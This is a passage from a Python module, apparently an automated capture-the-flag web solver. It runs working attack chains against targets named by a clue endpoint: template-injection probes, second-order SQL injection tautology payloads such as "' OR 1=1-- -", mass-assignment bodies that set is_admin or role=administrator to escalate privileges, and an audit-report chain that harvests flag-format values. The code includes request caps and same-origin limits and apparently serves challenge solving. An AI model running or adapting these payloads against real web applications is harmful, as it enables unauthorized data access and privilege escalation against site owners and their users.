        text = " ".join(str(clues.get(key) or "") for key in ("content_type", "media_type", "encoding"))
        if "json" in text.lower():
            return ("json", "form")
        return ("form", "json")

    @staticmethod
    def _ssti_syntaxes():
        # Prefix/suffix pairs keep every probe to constant arithmetic or one
        # scalar name.  There are no attribute, index, filter, call, or string
        # literals with which an engine could be turned into a read/RCE gadget.
        return (
            ("curly", "{{", "}}"),
            ("dollar", "${", "}"),
            ("hash", "#{", "}"),
            ("erb", "<%= ", " %>"),
        )

    def _run_post_ssti(self, clues, route):
        self.cls = "post_ssti"
        # Constant arithmetic only.  A reflection of the payload cannot contain
        # this decimal product unless the target evaluated it.
        left, right = 7213, 4567
        product = str(left * right)
        baseline = "\n".join(self.baseline_texts)
        if re.search(r"(?<!\d)" + re.escape(product) + r"(?!\d)", baseline):
            self.stopped = self.stopped or "arithmetic control already in baseline"
            return None
        for field in self._ssti_fields(clues):
            for encoding in self._ssti_encodings(clues):
                for syntax, prefix, suffix in self._ssti_syntaxes():
                    if self.posts >= POST_SSTI_CONFIRM_CAP:
                        self.stopped = self.stopped or "post_ssti probe cap"
                        return None
                    marker = prefix + str(left) + "*" + str(right) + suffix
                    response = self.post(
                        route, {field: marker}, encoding, f"post-ssti-confirm-{syntax}"
                    )
                    if response is None:
                        return None
                    # Every confirmation attempt is a control, including an
                    # error response.  A decoy first exposed by a losing
                    # syntax/field/transport must never become novel merely
                    # because a later evaluation response repeats it.
                    rendered = self._render_values(response)
                    self._remember_baseline(response)
                    if not (isinstance(response.get("status"), int) and
                            200 <= response["status"] < 300):
                        continue
                    # Only the clue-named render slot can confirm evaluation.
                    # A product in surrounding help/debug text is still plain.
                    if product not in rendered:
                        continue
                    # The confirmed engine exposes its scalar under a per-event
                    # variable name.  Ask for each candidate and take the first
                    # that renders a scalar; only if none do is the engine
                    # confirmed-but-empty.
                    empty_reason = None
                    for payoff_var in ssti_payoff_vars():
                        payload_expr = prefix + payoff_var + suffix
                        payoff = self.post(
                            route, {field: payload_expr}, encoding,
                            f"post-ssti-{payoff_var}-{syntax}"
                        )
                        if payoff is None:
                            return None
                        rendered_values = [
                            value for value in self._render_values(payoff)
                            if value != payload_expr
                        ]
                        if not rendered_values:
                            empty_reason = "confirmed engine returned no scalar value"
                            continue
                        return self._record_payoff(
                            payoff,
                            extra=[value for value in rendered_values if _proofish(value)],
                            payoff_text="\n".join(rendered_values),
                            where=f"post_ssti:{field}:{encoding}:{syntax}",
                        )
                    if empty_reason is not None:
                        self.stopped = self.stopped or empty_reason
                        return None
        self.stopped = self.stopped or "no evaluated POST template field"
        return None

    @staticmethod
    def _second_order_applicable(feature_response, secondary_response):
        if not _class_on("second_order_sqli"):
            return False
        fdoc = _json_document(feature_response)
        sdoc = _json_document(secondary_response)
        if not isinstance(fdoc, dict) or _error(fdoc) not in _POST_REQUIRED:
            return False
        if not isinstance(secondary_response, dict) or secondary_response.get("status") != 200 \
                or not isinstance(sdoc, dict):
            return False
        effect = _snake(sdoc.get("effect"))
        rows = sdoc.get("rows")
        return effect == _D12_EFFECT and isinstance(rows, list) and bool(rows) \
            and all(isinstance(value, (str, int, float)) and not isinstance(value, bool) for value in rows[:20])

    @staticmethod
    def _second_order_fields(clues):
        out = []
        for key in ("filter_parameter", "filter_field", "input_parameter", "body_field", "field"):
            value = clues.get(key)
            if (isinstance(value, str) and
                    re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{0,40}", value) and value not in out):
                out.append(value)
        # An explicit wire name is stronger than a guessed alias.  Fall back to
        # the one observed contract only when the target advertises none.
        return tuple(out[:2]) if out else ("filter",)

    @staticmethod
    def _second_order_encodings(clues):
        text = " ".join(str(clues.get(key) or "") for key in
                        ("content_type", "media_type", "encoding")).lower()
        if "form" in text or "x-www-form-urlencoded" in text:
            return ("form",)
        return ("json",)

    @staticmethod
    def _second_order_payloads():
        # Four common quote contexts, each still only the same tautology.  No
        # UNION, stacked query, delay, file, metadata, or destructive primitive.
        return (
            ("single_numeric", "' OR 1=1-- -"),
            ("double_numeric", '" OR 1=1-- -'),
            ("single_string", "' OR '1'='1'-- -"),
            ("double_string", '" OR "1"="1"-- -'),
        )

    def _run_second_order(self, clues, feature, secondary, secondary_response):
        self.cls = "second_order_sqli"
        baseline_doc = _json_document(secondary_response)
        baseline_rows = [str(value) for value in baseline_doc.get("rows", [])[:20]]
        attempts = 0
        for field in self._second_order_fields(clues):
            for encoding in self._second_order_encodings(clues):
                for context, payload in self._second_order_payloads():
                    if attempts >= SECOND_ORDER_POST_CAP:
                        self.stopped = self.stopped or "second-order payload cap"
                        return None
                    if not self._can_complete_mutation_readback():
                        return None
                    attempts += 1
                    response = self.post(
                        feature, {field: payload}, encoding, f"second-order-plant-{context}",
                        reserve_after=PAIR_READBACK_RESERVE,
                    )
                    if response is None:
                        return None
                    # The plant acknowledgement is always a control.  Record
                    # failures too: a token leaked by a rejected quote context
                    # cannot be promoted by a later readback.
                    self._remember_baseline(response)
                    if not (isinstance(response.get("status"), int) and
                            200 <= response["status"] < 300):
                        continue
                    readback = self.get(secondary, "second-order-readback", fresh=True)
                    doc = _json_document(readback)
                    if not (isinstance(readback, dict) and readback.get("status") == 200 and
                            isinstance(doc, dict)):
                        self._remember_baseline(readback)
                        continue
                    rows = ([str(value) for value in doc.get("rows", [])[:40]]
                            if isinstance(doc.get("rows"), list) else [])
                    effect = _snake(doc.get("effect"))
                    new_rows = [value for value in rows if value not in baseline_rows]
                    anchored = (effect == _D12_EFFECT and bool(new_rows) and
                                all(value in rows for value in baseline_rows))
                    if not anchored:
                        self._remember_baseline(readback)
                        if rows:
                            baseline_rows = rows
                        continue
                    proof_rows = [value for value in new_rows if _proofish(value)]
                    if proof_rows:
                        return self._record_payoff(
                            readback,
                            extra=proof_rows,
                            payoff_text=json.dumps(proof_rows, separators=(",", ":")),
                            where=f"second_order_sqli:{field}:{encoding}:{context}",
                        )
                    # The delayed view changed, but not with a flag-format value.
                    # Make that state a new control before trying another quote
                    # context so it cannot become a later false positive.
                    self._remember_baseline(readback)
                    baseline_rows = rows
        self.stopped = self.stopped or "second-order readback yielded no flag-format private row"
        return None

    @staticmethod
    def _mass_assignment_applicable(clues, root, feature_response, secondary_response, prompt):
        if not _class_on("mass_assignment"):
            return False
        fdoc = _json_document(feature_response)
        sdoc = _json_document(secondary_response)
        role = str(clues.get("current_role") or "").strip().lower()
        local = _text(root) + "\n" + str(clues.get("framework") or "") + "\n" + prompt
        named = bool(re.search(
            r"(?i)\b(?:profile\s+binder|mass[- ]assignment|over[- ]?post(?:ing)?|"
            r"binds?\s+(?:whatever|every)|hand\s+it\s+a\s+promotion)\b", local
        ))
        return (role in _LOW_ROLES and named and isinstance(fdoc, dict) and
                _error(fdoc) in _POST_REQUIRED and isinstance(sdoc, dict) and
                _error(sdoc) in _ADMIN_REQUIRED and
                secondary_response.get("status") in (401, 403))

    @staticmethod
    def _promotion_payloads():
        # Historical exact body first; each privilege property is isolated so a
        # validation failure or alias collision cannot hide the working field.
        return (
            {"name": "attacker", "is_admin": True},
            {"name": "attacker", "role": "administrator"},
            {"name": "attacker", "isAdmin": True},
            {"name": "attacker", "admin": True},
            {"name": "attacker", "is_administrator": True},
        )

    def _run_mass_assignment(self, feature, secondary):
        self.cls = "mass_assignment"
        for index, payload in enumerate(self._promotion_payloads(), 1):
            if not self._can_complete_mutation_readback():
                return None
            response = self.post(feature, payload, "json", f"mass-assignment-{index}",
                                 reserve_after=PAIR_READBACK_RESERVE)
            if response is None:
                return None
            # Every mutation acknowledgement is a control, including errors.
            # This prevents a token on a losing field from becoming a later
            # privileged-read novelty.
            self._remember_baseline(response)
            if not isinstance(response.get("status"), int) or not 200 <= response["status"] < 300:
                continue
            readback = self.get(secondary, "mass-assignment-readback", fresh=True)
            if not isinstance(readback, dict):
                continue
            if readback.get("status") in (401, 403):
                self._remember_baseline(readback)
                continue
            doc = _json_document(readback)
            if not isinstance(readback.get("status"), int) or not 200 <= readback["status"] < 300 \
                    or not isinstance(doc, dict) or _error(doc):
                self._remember_baseline(readback)
                continue
            effect = _snake(doc.get("effect"))
            labelled = any(path and LABEL_KEY.search(_snake(path[-1])) and value not in (None, "", False)
                           for path, value in _walk(doc))
            affirmed = any(_snake(path[-1]) in {"ok", "success", "authorized", "administrator"}
                           and _truthy(value) for path, value in _walk(doc) if path)
            if effect != _D13_EFFECT and not (labelled and affirmed):
                self._remember_baseline(readback)
                continue
            key = next((name for name in payload if name != "name"), "field")
            anchor_view, sibling_views = _coherent_json_view(readback, doc)
            if anchor_view is None:
                self._remember_baseline(readback)
                continue
            sibling_candidates = _carrier_candidates(sibling_views)
            if sibling_candidates:
                self.success = True
                self.where = f"mass_assignment:{key}:json"
                self.candidates = sibling_candidates[:12]
                self.stopped = "privilege anchor and proof/candidate occupied different carrier views"
                return None
            return self._record_payoff(readback, where=f"mass_assignment:{key}:json",
                                       payoff_text=anchor_view)
        self.stopped = self.stopped or "promotion fields did not unlock secondary route"
        return None

    @staticmethod
    def _audit_report_contract(feature_response, secondary_response):
        """The exact target-authored mapping plus the pre-operation audit ids."""
        fdoc = _json_document(feature_response)
        sdoc = _json_document(secondary_response)
        if (not isinstance(fdoc, dict) or _error(fdoc) not in _POST_REQUIRED
                or not isinstance(secondary_response, dict)
                or secondary_response.get("status") != 200 or not isinstance(sdoc, dict)):
            return None
        report = sdoc.get("report")
        events = sdoc.get("events")
        if not isinstance(report, dict) or not isinstance(events, list) or len(events) > 200:
            return None
        method = str(report.get("method") or "").strip().upper()
        fields = report.get("fields")
        if (method != "POST" or not isinstance(fields, list) or len(fields) != 3
                or not all(isinstance(field, str) and
                           re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{0,63}", field)
                           for field in fields)):
            return None
        normalized = [_snake(field) for field in fields]
        if frozenset(normalized) != _AUDIT_FIELDS or len(set(normalized)) != 3:
            return None
        # The operation response supplies the id used to select one readback
        # row. Retain every comparable id from the control snapshot so an id
        # reused by the target cannot make a stale row look newly generated.
        initial_export_ids = set()
        for event in events:
            if not isinstance(event, dict):
                continue
            for key, value in event.items():
                if (_snake(key) == "export_id" and isinstance(value, (str, int))
                        and not isinstance(value, bool)):
                    value = str(value).strip()
                    if value and len(value) <= 128:
                        initial_export_ids.add(value)
        return {"fields": dict(zip(normalized, fields)),
                "initial_export_ids": frozenset(initial_export_ids)}

    @staticmethod
    def _audit_member(doc, name):
        values = [value for key, value in (doc.items() if isinstance(doc, dict) else ())
                  if _snake(key) == name]
        return values[0] if len(values) == 1 else None

    @staticmethod
    def _audit_operation(doc):
        if not isinstance(doc, dict) or _error(doc) or not _truthy(doc.get("ok")):
            return None
        export_id = _Runner._audit_member(doc, "export_id")
        operation = _Runner._audit_member(doc, "operation")
        if (not isinstance(export_id, (str, int)) or isinstance(export_id, bool)
                or not isinstance(operation, str)):
            return None
        export_id = str(export_id).strip()
        operation = operation.strip()
        normalized_operation = _snake(operation)
        if (not export_id or len(export_id) > 128
                or any(ord(ch) < 0x20 or ord(ch) == 0x7f for ch in export_id)
                or len(operation) > 64
                or not re.fullmatch(r"[a-z][a-z0-9_]{1,63}", normalized_operation)):
            return None
        return export_id, operation

    @staticmethod
    def _audit_observed_event(doc, export_id):
        """Derive one event name from the row correlated to this new export id."""
        if not isinstance(doc, dict) or _error(doc):
            return None
        events = doc.get("events")
        if not isinstance(events, list) or len(events) > 200:
            return None
        values = []
        for event in events:
            if not isinstance(event, dict):
                continue
            ids = [str(value).strip() for key, value in event.items()
                   if _snake(key) == "export_id" and isinstance(value, (str, int))
                   and not isinstance(value, bool)]
            if ids != [export_id]:
                continue
            local = []
            for key in _AUDIT_EVENT_KEYS:
                matches = [value for raw_key, value in event.items() if _snake(raw_key) == key]
                for value in matches:
                    if isinstance(value, str):
                        raw_value = value.strip()
                        normalized = _snake(raw_value)
                        if re.fullmatch(r"[a-z][a-z0-9_]{1,63}", normalized):
                            local.append(raw_value)
            local = list(dict.fromkeys(local))
            if len(local) != 1:
                return None
            values.extend(local)
        values = list(dict.fromkeys(values))
        return values[0] if len(values) == 1 else None

    def _run_audit_report(self, feature, secondary, contract):
        """Create one operation, read its misclassified audit row, then report it."""
        self.cls = "audit_report_chain"
        fields = contract["fields"]
        initial_export_ids = contract["initial_export_ids"]
        if not self._can_complete_sequence(3, 2, reserve=AUDIT_SEQUENCE_RESERVE):
            return None
        action = self.post(feature, {}, "json", "audit-operation",
                           reserve_after=AUDIT_AFTER_ACTION_RESERVE)
        if action is None:
            return None
        # The operation response is a control.  It may disclose the id and
        # operation needed for the next requests, but a proof in it is a decoy.
        self._remember_baseline(action)
        if not (isinstance(action.get("status"), int) and 200 <= action["status"] < 300):
            self.stopped = self.stopped or "audit operation POST was not accepted"
            return None
        action_doc = _json_document(action)
        operation = self._audit_operation(action_doc)
        if operation is None:
            self.stopped = self.stopped or "audit operation returned no coherent export id/operation"
            return None
        export_id, missing_event = operation
        if export_id in initial_export_ids:
            self.stopped = self.stopped or "audit operation reused a pre-existing export id"
            return None

        readback = self.get(secondary, "audit-event-readback", fresh=True,
                            reserve_after=AUDIT_AFTER_READBACK_RESERVE)
        if not (isinstance(readback, dict) and readback.get("status") == 200):
            self._remember_baseline(readback)
            self.stopped = self.stopped or "audit event readback failed"
            return None
        readback_doc = _json_document(readback)
        observed_event = self._audit_observed_event(readback_doc, export_id)
        self._remember_baseline(readback)
        if observed_event is None or _snake(observed_event) == _snake(missing_event):
            self.stopped = self.stopped or "audit log did not show one differently named event for the export"
            return None

        report = self.post(
            secondary,
            {fields["export_id"]: export_id, fields["missing_event"]: missing_event,
             fields["observed_event"]: observed_event},
            "json", "audit-missing-event-report",
        )
        doc = _json_document(report)
        if (not isinstance(report, dict) or not isinstance(report.get("status"), int)
                or not 200 <= report["status"] < 300 or not isinstance(doc, dict)
                or _error(doc) or not _truthy(doc.get("ok"))
                or _snake(doc.get("effect")) != _AUDIT_EFFECT):
            self._remember_baseline(report)
            self.stopped = self.stopped or "audit report did not confirm the exact missing-event effect"
            return None
        anchor_view, sibling_views = _coherent_json_view(report, doc)
        if anchor_view is None:
            self._remember_baseline(report)
            self.stopped = self.stopped or "audit report effect did not occupy one coherent JSON carrier"
            return None
        sibling_candidates = _carrier_candidates(sibling_views)
        if sibling_candidates:
            self.success = True
            self.where = "audit_report_chain:json"
            self.candidates = sibling_candidates[:12]
            self.stopped = "audit anchor and proof/candidate occupied different carrier views"
            return None
        return self._record_payoff(
            report, where="audit_report_chain:json", payoff_text=anchor_view)

    def run(self):
        if not enabled():
            self.stopped = "off"
            return None
        if self.client is None or self.max_requests <= 0:
            self.stopped = self.stopped or "max_requests"
            return None
        if self.left() is not None and self.left() <= DEADLINE_PAD:
            self.stopped = "deadline"
            return None

        root = self.get("/", "landing-control")
        if isinstance(root, dict) and root.get("status") == 410:
            self.stopped = "completed"
            return None
        clue_response = self.get("/api/clues", "clues-control")
        clues = _json_document(clue_response)
        if (not isinstance(clue_response, dict) or not isinstance(clue_response.get("status"), int)
                or not 200 <= clue_response["status"] < 300 or not isinstance(clues, dict)):
            self.stopped = self.stopped or "no JSON clue contract"
            return None
        feature = _same_origin_route(clues.get("feature_route"), self.url)
        if not feature:
            self.stopped = self.stopped or "no safe clue-named feature route"
            return None
        feature_response = self.get(feature, "feature-control")
        if feature_response is None:
            return None

        prompt = "\n".join(str(value or "") for value in (
            self.ctx.get("prompt"), self.ctx.get("question"), self.target.get("question")
        ))
        secondary = _same_origin_route(clues.get("secondary_route"), self.url)
        secondary_response = self.get(secondary, "secondary-control") if secondary else None

        audit_contract = self._audit_report_contract(feature_response, secondary_response) if secondary else None
        if audit_contract is not None:
            return self._run_audit_report(feature, secondary, audit_contract)
        if secondary and self._second_order_applicable(feature_response, secondary_response):
            return self._run_second_order(clues, feature, secondary, secondary_response)
        if secondary and self._mass_assignment_applicable(
                clues, root, feature_response, secondary_response, prompt):
            return self._run_mass_assignment(feature, secondary)
        if not secondary and self._post_ssti_applicable(clues, root, feature_response, prompt):
            return self._run_post_ssti(clues, feature)

        self.stopped = self.stopped or "not an observed exact POST chain"
        return None

    def summary(self, proof):
        baseline_incomplete = False
        if _proof_policy is not None and hasattr(_proof_policy, "baseline_set_incomplete"):
            try:
                baseline_incomplete = bool(
                    _proof_policy.baseline_set_incomplete(self.baseline_texts))
            except Exception:
                baseline_incomplete = True
        return {"proof": proof, "class": self.cls, "success": self.success,
                "candidates": list(dict.fromkeys(self.candidates))[:12], "uuid4": self.uuid4,
                "requests": self.requests, "posts": self.posts,
                "baseline_incomplete": baseline_incomplete,
                "seconds": round(time.time() - self.t0, 3), "where": self.where,
                "stopped": self.stopped, "responses": self.responses[:60]}


def _append_evidence(ctx, line):
    evidence = ctx.get("evidence")
    if not isinstance(evidence, list):
        return
    line = _web.safe_display_text(line, 600)
    lock = ctx.get("_evidence_lock")
    if hasattr(lock, "__enter__"):
        with lock:
            if line not in evidence:
                evidence.append(line)
    elif line not in evidence:
        evidence.append(line)


def _surface(runner, ctx):
    aid = runner.target.get("answer_id") or "target"
    for value in list(dict.fromkeys(runner.candidates))[:6]:
        clean = _web.safe_display_text(value, 256)
        _append_evidence(
            ctx,
            f"WEB POST-CHAIN CANDIDATE {aid}: {clean} (successful exploit response; not auto-submitted)",
        )


def solve(target, ctx=None):
    """Solve one target.  Never submits and never raises."""
    ctx = dict(ctx or {})
    runner = _Runner(target, ctx)
    proof = None
    try:
        proof = runner.run()
    except Exception as exc:  # fail closed: the agent receives None and the summary
        runner.stopped = runner.stopped or f"error: {type(exc).__name__}"
    finally:
        runner.stop_now()
    _surface(runner, ctx)
    summary = runner.summary(proof)
    sink = ctx.get("result_sink")
    if isinstance(sink, dict):
        sink[runner.target.get("answer_id") or "target"] = summary
    logged = dict(runner.target)
    logged.setdefault("answer_id", "target")
    _write_log(ctx.get("log_dir"), ctx.get("challenge"), [logged], {logged["answer_id"]: summary})
    return proof


def solve_targets(targets, ctx=None):
    """Run targets concurrently behind one deadline; no request outlives the call."""
    try:
        ctx = dict(ctx or {})
        valid = [dict(target) for target in list(targets or [])
                 if isinstance(target, dict) and target.get("answer_id") and target.get("url")]
    except Exception:
        return {}
    results, summaries, runners = {}, {}, {}
    lock = threading.Lock()
    ctx["_evidence_lock"] = threading.Lock()

    def one(target):
        aid = target["answer_id"]
        local = dict(ctx)
        runner = _Runner(target, local)
        with lock:
            runners[aid] = runner
        try:
            proof = runner.run()
        except Exception as exc:
            runner.stopped = runner.stopped or f"error: {type(exc).__name__}"
            proof = None
        finally:
            runner.stop_now()
        with lock:
            results[aid] = proof
            summaries[aid] = runner.summary(proof)
        _surface(runner, ctx)

    threads = [threading.Thread(target=one, args=(target,),
                                name=f"post-chain-{target['answer_id']}", daemon=True)
               for target in valid]
    for thread in threads:
        thread.start()
    try:
        deadline = float(ctx["deadline"]) if ctx.get("deadline") is not None else None
    except (TypeError, ValueError):
        deadline = None
    for thread in threads:
        thread.join(timeout=None if deadline is None else max(0.0, deadline - time.time()))
    for runner in list(runners.values()):
        runner.stop_now()
    # stop_now waits out any in-flight bounded WebClient call and closes the send
    # gate.  The remaining Python work is finite and contains no request site.
    for thread in threads:
        thread.join()
    for target in valid:
        aid = target["answer_id"]
        results.setdefault(aid, None)
        if aid in runners:
            summaries[aid] = runners[aid].summary(results[aid])
    _write_log(ctx.get("log_dir"), ctx.get("challenge"), valid, summaries)
    sink = ctx.get("result_sink")
    if isinstance(sink, dict):
        sink.update(summaries)
    return results


def _write_log(log_dir, challenge, targets, summaries):
    if not log_dir:
        return
    try:
        folder = Path(log_dir)
        folder.mkdir(parents=True, exist_ok=True)
        at = _dt.datetime.now().astimezone().isoformat(timespec="seconds")
        with (folder / "post_chain.jsonl").open("a", encoding="utf-8") as handle:
            for target in targets:
                aid = target["answer_id"]
                row = {"at": at, "challenge": challenge, "answer_id": aid, "index": target.get("index")}
                row.update(summaries.get(aid) or {"proof": None, "stopped": "no result"})
                handle.write(json.dumps(row, separators=(",", ":"), default=str) + "\n")
    except Exception:
        pass


__all__ = [
    "DEFAULT_MAX_REQUESTS", "DEFAULT_SECONDS", "MAX_POSTS", "POST_SSTI_CONFIRM_CAP",
    "SECOND_ORDER_POST_CAP", "MAX_ROUTE_BYTES", "MAX_REQUEST_BODY_BYTES", "PAYOFF_WIRE",
    "enabled", "extract_anchored", "solve", "solve_targets",
]
